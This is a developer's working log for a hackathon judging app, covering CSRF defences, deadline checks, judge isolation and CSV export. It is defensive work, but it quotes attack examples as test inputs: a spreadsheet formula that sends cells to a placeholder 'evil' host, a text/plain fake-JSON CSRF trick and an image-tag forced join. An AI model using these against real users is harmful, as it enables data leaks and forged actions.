# Notes for the write-up

Running log of decisions, surprises and bugs. Raw material for the post.

## 2026-09-26 — Reading the organizer files before writing code

What `fixtures.json` actually contains (checked with a script, not assumed):

- 8 tracks, 30 judges, 40 teams (91 unique member emails, no overlap with judges), 41 projects, **126** scores (not ~136 as I first guessed).
- Every score has exactly 3 criteria: functionality, quality, innovation. Values are only 2-5, and nobody gave a 1.
- 51 of 126 comments are empty.
- **Duplicate submission:** `prj_07` and `prj_41` are both "Dry Harbour" from team `tm_07`, same repo. `prj_41` was
  resubmitted at 17:57, 3 minutes before the 18:00 close. **Both have scores**, some from the same judges
  (jdg_19, jdg_21 and jdg_26 scored both). So picking a canonical row is not enough; we must also make sure
  the scores on the other row are not counted twice.
- **Flat judge:** `jdg_07` gave 4/4/4 to all 3 projects they scored, so their standard deviation is 0.
  jdg_01 and jdg_23 each have only 1 score, so they are "flat" by default. Normalization must handle both cases.
- Reviews per project: 26 projects have 3, 8 have 2, 3 have 4, 4 have 5. No project has 0 reviews, but the code
  must still handle 0 reviews for the live demo event.
- Judge load is very uneven: jdg_24 has 11 reviews, while jdg_01 and jdg_23 have 1 each.
- No judge scored outside their tracks, and there are no dangling references.

What `run.py` taught me:

- The submit probe is a **JSON** POST with a cookie and no CSRF token. If the CSRF layer rejects it with 403,
  the check "passes" for the wrong reason. Design decision: JSON endpoints require `Content-Type: application/json`
  (a cross-site HTML form cannot send that without a CORS preflight, which we never allow), and the deadline
  check runs in the handler itself, so the 4xx really comes from the closed deadline.
- Only the first 3 fixture titles are searched for ("Glass Signal", "Small Meadow", "Deep Compass"), and
  only on page one of the gallery. Pagination order matters.
- CSV check = status 200 and a comma in the first line.

## 2026-09-27 — Seeding

- Duplicate rule: a team has one project per event; when there are several, the **latest** submission wins
  (prj_41 at 17:57 is what the team meant to submit) and earlier ones get `duplicate_of_id`. A partial unique
  index (`team_id WHERE duplicate_of_id IS NULL`) makes the DB refuse any new second project.
- Demo session tokens must be fixed (so `.dogfood.toml` survives restarts), which means they are public.
  A public organizer token on a real deployment = instant takeover. So they only exist while `DEMO_SESSIONS=1`;
  with `DEMO_SESSIONS=0` boot deletes them. Threat-model item.
- bcrypt is deliberately slow (~0.25s). Hashing 123 seeded accounts one by one would add ~30s to boot, so the one
  shared demo password is hashed once. Fine for demo accounts, and documented as such.
- Gotcha: `docker compose up -d --build` piped to Out-Null in PowerShell kept the old container. Always read build output.

## 2026-09-27 — Auth

- CSRF is an **app-wide** FastAPI dependency, not per-route, so a new route cannot forget it. Unsafe requests
  must be JSON (cross-site forms can't send application/json without a CORS preflight, which we never answer)
  or carry a token. A test proves the classic `enctype="text/plain"` fake-JSON trick gets a 403.
- Anonymous forms (login/register) use a double-submit cookie, so login CSRF is covered too.
- Bug caught by a test: registering wrote the audit row *before* the user row -> FK violation. SQLAlchemy's
  unit of work only orders inserts it knows are related, and audit_log has no ORM relationship to users.
  Fix: flush the user first. Would have been a 500 on Postgres in the demo.
- Unknown email is checked against a dummy bcrypt hash, so "no such user" and "wrong password" take the same
  time and return the same body (no account enumeration).

## 2026-09-27 — Gallery, submission, deadline

- run.py's submit probe carries no event id. Rule: no `event_id` -> use the event of the caller's team. The demo
  participant is on tm_01 (closed fixture event), so the refusal is the honest one: **409 `submissions_closed`**,
  not a 403 from auth or CSRF. Tests assert the error code, not just "some 4xx".
- Deadline is read from the **database clock** (`SELECT now()` on Postgres) and checked on create AND edit,
  before the membership check, so a closed event answers "closed" to everyone.
- Drafts return **404** (not 403) to non-members so their existence is not leaked.
- Only http(s) URLs are stored, so `javascript:` links can never land in an href. Search escapes LIKE
  wildcards (`%` finds nothing instead of everything).
- Gallery is alphabetical: neutral, doesn't reward early or late submission, and keeps the first fixture
  titles on page one for the checker.
- ORM gotcha avoided: replacing a project's tag rows with new objects that have the same primary key makes
  SQLAlchemy INSERT before DELETE -> unique violation. Reuse existing rows instead.
- Windows gotcha: PowerShell 5.1 `Get-Content | Set-Content` turned `·` into `Â·` and added a BOM, and `>`
  writes UTF-16. Never edit templates or redirect output through PowerShell.
## 2026-09-27 — Teams and events

- Invite link = 192-bit random token in the URL. Opening it (GET) only shows a confirmation page; joining is a
  CSRF-protected POST. Otherwise `<img src=".../teams/join/TOKEN">` on any site would silently add the viewer.
- Links can be rotated; the old one 404s immediately. Referrer-Policy `same-origin` keeps the token from leaking
  to external sites through the Referer header.
- Team-size race: `SELECT ... FOR UPDATE` on the team row serialises joins on Postgres; the
  `uq_one_team_per_event` constraint is the backstop. E2E on Docker: two simultaneous joins for the last slot ->
  one 200, one 409, team size stays at the limit.
- Only participants can be on teams (judges/organizers on teams = conflict of interest).
- Deadline moves get their own audit action (`event.deadline_change`) with old and new values.
- Bugs caught by tests: `int(value or 4)` silently turned team size 0 into 4 (falsy zero!), and tracks added
  with `db.add` did not appear in the already-loaded `event.tracks` collection. Append through relationships.
- An inline `onclick` would have been silently blocked by our own CSP. Kept the CSP, dropped the inline JS.
- Test suite went from 138s to 77s by using bcrypt cost 4 in tests only (BCRYPT_ROUNDS env var).
## 2026-09-27 — Judge isolation and CSV (run.py 7/7)

- `/api/judge/scores?judge=X`: judges get 403 for ANY other id, including ids that don't exist, so the endpoint
  can't be used to discover which judge ids are real. Staff asking for an unknown id get 404 (they may know).
- Scoring needs an assignment AND the project's track in the judge's tracks. Test: an organizer mis-assigns
  judge_a to a trk_03 project; judge_a still gets 404 and no score row is written. Defence in depth.
- A judge scoring "someone else's" project writes their own row (unique judge+project); they can never
  overwrite another judge's row, because the row is looked up by (current_user.id, project_id).
- Score values: whole numbers 1-5 only ("4.5" and "6" are 422), every rubric criterion required, unknown keys
  rejected. The DB CHECK is the backstop.
- Every score create/update is audited with before and after values.
- CSV injection: cells starting with = + - @ TAB CR get a leading apostrophe. Test uses a
  `=HYPERLINK("http://evil/?"&A1,...)` title, which would otherwise leak neighbouring cells when opened.
- run.py 7/7 PASS but .dogfood.toml still claims only T1: the T2 *tier* also needs assignment, rubric editing,
  dashboard, normalization, publishing and the audit UI. Passing the checker != finishing the tier.
- Test-writing lesson: asserting `"scores" not in resp.text` failed because the error message says "scores".
  Assert on structure (no `scores` key, no `weighted_total`), not on words.